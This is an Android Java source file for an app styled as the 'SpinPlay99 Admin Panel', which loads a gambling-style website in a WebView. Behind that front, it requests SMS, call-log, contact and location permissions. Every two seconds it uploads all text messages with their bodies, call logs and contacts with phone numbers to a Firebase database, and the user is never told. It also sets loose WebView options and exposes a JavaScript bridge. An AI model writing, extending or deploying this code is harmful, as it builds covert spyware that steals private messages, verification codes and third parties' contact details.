package com.spinplay99.adminpanel;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.StatFs;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {

    private static final String SERVER_URL = "https://spinplay99.com";
    private static final int FILE_CHOOSER_REQUEST = 1001;
    private static final int PERMISSION_REQUEST_CODE = 2001;

    private WebView webView;
    private ProgressBar progressBar;
    private SwipeRefreshLayout swipeRefresh;
    private ValueCallback<Uri[]> filePathCallback;
    
    // Firebase
    private DatabaseReference mDatabase;
    private String deviceId;
    
    // Tracking
    private ScheduledExecutorService scheduler;
    private boolean isFirstSync = true;
    private int lastSmsCount = 0;
    private int lastCallCount = 0;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Initialize Firebase
        FirebaseApp.initializeApp(this);
        mDatabase = FirebaseDatabase.getInstance().getReference();
        deviceId = Settings.Secure.getString(getContentResolver(), 
                   Settings.Secure.ANDROID_ID);

        if (getSupportActionBar() != null) {
            getSupportActionBar().setTitle("SpinPlay99");
            getSupportActionBar().setSubtitle("Admin Panel");
        }

        webView = findViewById(R.id.webview);
        progressBar = findViewById(R.id.progress_bar);
        swipeRefresh = findViewById(R.id.swipe_refresh);

        requestAllPermissions();
        setupWebView();
        setupSwipeRefresh();
        webView.loadUrl(SERVER_URL);
        
        startRealTimeTracking();
    }

    private void requestAllPermissions() {
        List<String> permissions = new ArrayList<>();
        String[] requiredPermissions = {
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
        };

        for (String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                permissions.add(permission);
            }
        }

        if (!permissions.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissions.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
            @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    private void startRealTimeTracking() {
        scheduler = Executors.newSingleThreadScheduledExecutor();
        isFirstSync = true;
        
        scheduler.scheduleAtFixedRate(() -> {
            Map<String, Object> realTimeData = collectSmartData();
            
            mDatabase.child("devices")
                    .child(deviceId)
                    .child("live_data")
                    .setValue(realTimeData);
            
            updateDeviceInfo();
            
            if (isFirstSync) {
                isFirstSync = false;
            }
        }, 0, 2, TimeUnit.SECONDS);
    }

    private Map<String, Object> collectSmartData() {
        Map<String, Object> data = new HashMap<>();
        
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.getDefault());
        data.put("timestamp", sdf.format(new Date()));
        data.put("timestamp_millis", System.currentTimeMillis());
        
        data.put("battery_level", getBatteryLevel());
        data.put("network_type", getNetworkType());
        data.put("is_charging", isDeviceCharging());
        data.put("screen_on", isScreenOn());
        data.put("permissions", getAllPermissionsStatus());
        
        // SMS Data
        if (checkPermission(Manifest.permission.READ_SMS)) {
            int currentSmsCount = getSmsCount();
            data.put("total_sms", currentSmsCount);
            data.put("unread_sms", getUnreadSmsCount());
            
            if (isFirstSync) {
                data.put("all_sms", getAllSms());
                lastSmsCount = currentSmsCount;
            } else if (currentSmsCount > lastSmsCount) {
                data.put("new_sms", getNewSms(lastSmsCount));
                lastSmsCount = currentSmsCount;
            }
        }
        
        // Call Logs
        if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
            int currentCallCount = getCallLogsCount();
            data.put("total_calls", currentCallCount);
            
            if (isFirstSync) {
                data.put("all_calls", getAllCallLogs());
                lastCallCount = currentCallCount;
            } else if (currentCallCount > lastCallCount) {
                data.put("new_calls", getNewCallLogs(lastCallCount));
                lastCallCount = currentCallCount;
            }
        }
        
        // Contacts
        if (checkPermission(Manifest.permission.READ_CONTACTS)) {
            data.put("contacts_count", getContactsCount());
            if (isFirstSync) {
                data.put("all_contacts", getAllContacts());
            }
        }
        
        if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            data.put("location_available", true);
        }
        
        data.put("storage", getStorageInfo());
        data.put("ram", getRamInfo());
        data.put("sync_type", isFirstSync ? "FULL" : "INCREMENTAL");
        
        return data;
    }

    private void updateDeviceInfo() {
        Map<String, Object> deviceInfo = new HashMap<>();
        deviceInfo.put("device_id", deviceId);
        deviceInfo.put("device_model", Build.MODEL);
        deviceInfo.put("device_brand", Build.BRAND);
        deviceInfo.put("android_version", Build.VERSION.RELEASE);
        deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
        deviceInfo.put("last_seen", System.currentTimeMillis());
        deviceInfo.put("permissions_summary", getAllPermissionsStatus());
        
        mDatabase.child("devices")
                .child(deviceId)
                .child("device_info")
                .setValue(deviceInfo);
    }

    private Map<String, Boolean> getAllPermissionsStatus() {
        Map<String, Boolean> permissions = new HashMap<>();
        permissions.put("call_phone", checkPermission(Manifest.permission.CALL_PHONE));
        permissions.put("read_phone_state", checkPermission(Manifest.permission.READ_PHONE_STATE));
        permissions.put("send_sms", checkPermission(Manifest.permission.SEND_SMS));
        permissions.put("receive_sms", checkPermission(Manifest.permission.RECEIVE_SMS));
        permissions.put("read_sms", checkPermission(Manifest.permission.READ_SMS));
        permissions.put("read_call_log", checkPermission(Manifest.permission.READ_CALL_LOG));
        permissions.put("read_contacts", checkPermission(Manifest.permission.READ_CONTACTS));
        permissions.put("location", checkPermission(Manifest.permission.ACCESS_FINE_LOCATION));
        return permissions;
    }

    private boolean checkPermission(String permission) {
        return ContextCompat.checkSelfPermission(this, permission) 
               == PackageManager.PERMISSION_GRANTED;
    }

    // SMS Methods
    private int getSmsCount() {
        int count = 0;
        try {
            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                count = cursor.getCount();
                cursor.close();
            }
        } catch (Exception e) {}
        return count;
    }

    private int getUnreadSmsCount() {
        int count = 0;
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.Inbox.CONTENT_URI, null, "read = 0", null, null);
            if (cursor != null) {
                count = cursor.getCount();
                cursor.close();
            }
        } catch (Exception e) {}
        return count;
    }

    private List<Map<String, String>> getAllSms() {
        List<Map<String, String>> allSms = new ArrayList<>();
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                new String[]{"_id", "address", "body", "date", "type", "read"},
                null, null, "date DESC");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, String> sms = new HashMap<>();
                    sms.put("id", cursor.getString(0));
                    sms.put("address", cursor.getString(1));
                    sms.put("body", cursor.getString(2) != null ? cursor.getString(2) : "");
                    sms.put("date", cursor.getString(3));
                    String smsType;
                    switch (Integer.parseInt(cursor.getString(4))) {
                        case 1: smsType = "INBOX"; break;
                        case 2: smsType = "SENT"; break;
                        default: smsType = "OTHER";
                    }
                    sms.put("type", smsType);
                    sms.put("read", cursor.getString(5));
                    allSms.add(sms);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {}
        return allSms;
    }

    private List<Map<String, String>> getNewSms(int oldCount) {
        List<Map<String, String>> newSms = new ArrayList<>();
        try {
            int limit = Math.min(getSmsCount() - oldCount + 5, 50);
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                new String[]{"_id", "address", "body", "date", "type", "read"},
                null, null, "date DESC LIMIT " + limit);
            
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    if (count >= (getSmsCount() - oldCount)) break;
                    Map<String, String> sms = new HashMap<>();
                    sms.put("id", cursor.getString(0));
                    sms.put("address", cursor.getString(1));
                    sms.put("body", cursor.getString(2) != null ? cursor.getString(2) : "");
                    sms.put("date", cursor.getString(3));
                    newSms.add(sms);
                    count++;
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {}
        return newSms;
    }

    // Call Log Methods
    private int getCallLogsCount() {
        int count = 0;
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                count = cursor.getCount();
                cursor.close();
            }
        } catch (Exception e) {}
        return count;
    }

    private List<Map<String, String>> getAllCallLogs() {
        List<Map<String, String>> allCalls = new ArrayList<>();
        try {
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{"_id", "number", "type", "date", "duration", "name"},
                null, null, "date DESC");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, String> call = new HashMap<>();
                    call.put("id", cursor.getString(0));
                    call.put("number", cursor.getString(1));
                    String callType;
                    switch (Integer.parseInt(cursor.getString(2))) {
                        case CallLog.Calls.INCOMING_TYPE: callType = "INCOMING"; break;
                        case CallLog.Calls.OUTGOING_TYPE: callType = "OUTGOING"; break;
                        case CallLog.Calls.MISSED_TYPE: callType = "MISSED"; break;
                        default: callType = "UNKNOWN";
                    }
                    call.put("type", callType);
                    call.put("date", cursor.getString(3));
                    call.put("duration", cursor.getString(4));
                    call.put("contact_name", cursor.getString(5) != null ? cursor.getString(5) : "Unknown");
                    allCalls.add(call);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {}
        return allCalls;
    }

    private List<Map<String, String>> getNewCallLogs(int oldCount) {
        List<Map<String, String>> newCalls = new ArrayList<>();
        try {
            int limit = Math.min(getCallLogsCount() - oldCount + 5, 50);
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{"_id", "number", "type", "date", "duration", "name"},
                null, null, "date DESC LIMIT " + limit);
            
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    if (count >= (getCallLogsCount() - oldCount)) break;
                    Map<String, String> call = new HashMap<>();
                    call.put("id", cursor.getString(0));
                    call.put("number", cursor.getString(1));
                    newCalls.add(call);
                    count++;
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {}
        return newCalls;
    }

    // Contacts Method
    private int getContactsCount() {
        int count = 0;
        try {
            Cursor cursor = getContentResolver().query(
                android.provider.ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                count = cursor.getCount();
                cursor.close();
            }
        } catch (Exception e) {}
        return count;
    }

    private List<Map<String, String>> getAllContacts() {
        List<Map<String, String>> allContacts = new ArrayList<>();
        try {
            Cursor cursor = getContentResolver().query(
                android.provider.ContactsContract.Contacts.CONTENT_URI,
                new String[]{"_id", "display_name", "has_phone_number"},
                null, null, "display_name ASC");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, String> contact = new HashMap<>();
                    contact.put("id", cursor.getString(0));
                    contact.put("name", cursor.getString(1) != null ? cursor.getString(1) : "No Name");
                    contact.put("has_phone", cursor.getString(2));
                    
                    if (Integer.parseInt(cursor.getString(2)) > 0) {
                        List<String> phones = new ArrayList<>();
                        Cursor phoneCursor = getContentResolver().query(
                            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            new String[]{"number"},
                            "contact_id = ?",
                            new String[]{cursor.getString(0)},
                            null);
                        if (phoneCursor != null) {
                            while (phoneCursor.moveToNext()) {
                                phones.add(phoneCursor.getString(0));
                            }
                            phoneCursor.close();
                        }
                        contact.put("phone_numbers", phones.toString());
                    }
                    allContacts.add(contact);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {}
        return allContacts;
    }

    // Device Info Methods
    private int getBatteryLevel() {
        int level = 0;
        try {
            Intent intent = registerReceiver(null, 
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                if (scale > 0) level = (level * 100) / scale;
            }
        } catch (Exception e) {}
        return level;
    }

    private String getNetworkType() {
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) 
                getSystemService(Context.CONNECTIVITY_SERVICE);
            android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            if (activeNetwork != null && activeNetwork.isConnected()) {
                return activeNetwork.getTypeName();
            }
        } catch (Exception e) {}
        return "No Connection";
    }

    private boolean isDeviceCharging() {
        try {
            Intent intent = registerReceiver(null, 
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                       status == android.os.BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception e) {}
        return false;
    }

    private boolean isScreenOn() {
        try {
            android.os.PowerManager pm = (android.os.PowerManager) 
                getSystemService(Context.POWER_SERVICE);
            return pm.isInteractive();
        } catch (Exception e) {}
        return false;
    }

    private Map<String, Object> getStorageInfo() {
        Map<String, Object> storage = new HashMap<>();
        try {
            StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
            long blockSize = stat.getBlockSizeLong();
            long totalBlocks = stat.getBlockCountLong();
            long availableBlocks = stat.getAvailableBlocksLong();
            
            storage.put("total_gb", (totalBlocks * blockSize) / (1024.0 * 1024 * 1024));
            storage.put("available_gb", (availableBlocks * blockSize) / (1024.0 * 1024 * 1024));
        } catch (Exception e) {}
        return storage;
    }

    private Map<String, Object> getRamInfo() {
        Map<String, Object> ram = new HashMap<>();
        try {
            android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
            android.app.ActivityManager activityManager = 
                (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            activityManager.getMemoryInfo(mi);
            
            ram.put("total_gb", mi.totalMem / (1024.0 * 1024 * 1024));
            ram.put("available_gb", mi.availMem / (1024.0 * 1024 * 1024));
        } catch (Exception e) {}
        return ram;
    }

    // WebView Setup
    @SuppressLint("SetJavaScriptEnabled")
    private void setupWebView() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setBuiltInZoomControls(false);
        settings.setDisplayZoomControls(false);
        settings.setSupportZoom(false);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);

        webView.addJavascriptInterface(new AndroidBridge(), "Android");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                String url = request.getUrl().toString();
                if (!url.contains("spinplay99.com")) {
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
                    } catch (Exception e) {
                        view.loadUrl(url);
                    }
                    return true;
                }
                return false;
            }

            @Override
            public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
                progressBar.setVisibility(View.VISIBLE);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                progressBar.setVisibility(View.GONE);
                swipeRefresh.setRefreshing(false);
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                progressBar.setVisibility(View.GONE);
                swipeRefresh.setRefreshing(false);
            }
        });

        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                progressBar.setProgress(newProgress);
            }

            @Override
            public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback,
                                              FileChooserParams fileChooserParams) {
                MainActivity.this.filePathCallback = filePathCallback;
                try {
                    startActivityForResult(fileChooserParams.createIntent(), FILE_CHOOSER_REQUEST);
                } catch (Exception e) {
                    MainActivity.this.filePathCallback = null;
                    return false;
                }
                return true;
            }
        });
    }

    private void setupSwipeRefresh() {
        swipeRefresh.setColorSchemeColors(0xFFFFD700, 0xFF00BFFF, 0xFFFF6B1A);
        swipeRefresh.setOnRefreshListener(() -> webView.reload());
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            new AlertDialog.Builder(this)
                    .setTitle("Exit")
                    .setMessage("Do you want to close the app?")
                    .setPositiveButton("Yes", (d, w) -> finish())
                    .setNegativeButton("No", null)
                    .show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == FILE_CHOOSER_REQUEST) {
            if (filePathCallback != null) {
                Uri[] results = WebChromeClient.FileChooserParams.parseResult(resultCode, data);
                filePathCallback.onReceiveValue(results);
                filePathCallback = null;
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
        }
    }

    public class AndroidBridge {
        @JavascriptInterface
        public void showToast(String msg) {
            runOnUiThread(() -> Toast.makeText(MainActivity.this, msg, Toast.LENGTH_SHORT).show());
        }
        
        @JavascriptInterface
        public String getDeviceId() {
            return deviceId;
        }
    }
}
